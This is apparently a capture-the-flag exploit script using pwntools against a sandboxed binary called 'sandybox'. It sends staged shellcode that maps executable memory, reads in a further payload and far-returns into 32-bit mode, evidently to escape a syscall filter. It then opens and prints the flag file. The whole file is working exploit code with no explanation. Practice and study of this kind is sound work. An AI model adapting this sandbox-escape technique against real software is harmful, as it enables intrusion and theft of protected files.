from pwn import *

e = ELF("./sandybox")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("sandybox.pwni.ng", 1337)
else:
  p = process(e.path)

code = asm("""
  xor eax, eax
  mov edx, 0xff
  syscall
""")

print(len(code))

p.send(code.ljust(10, asm("nop")))
p.send(asm(
  """
  mov rax, 9
  mov rdi, 0x1ff000
  mov rsi, 100
  mov rdx, 7
  mov r10, 0x22
  mov r8, -1
  mov r9, 0
  syscall

  mov rax, 0
  mov rdi, 0
  mov rsi, 0x1ff000
  mov rdx, 0x200
  syscall
  
  mov rax, 0x23001ff000
  push rax
  retf
  """
))

ui.pause()


fin = asm(
  shellcraft.write(1, 0x1ff600, 0x40)
)

context.bits=32
context.arch="i386"


print(shellcraft.sh())

p.send(asm(
  """
    mov esp, 0x1ff500
    mov esi, 0
  """ 
  + shellcraft.open("flag")
  + "mov edi, 1\n"
  + shellcraft.read(3, 0x1ff600, 0x40)
  + """
    push 0x33
    push 0x1ff100
    retf
  """
).ljust(0x100) + fin)


p.interactive()
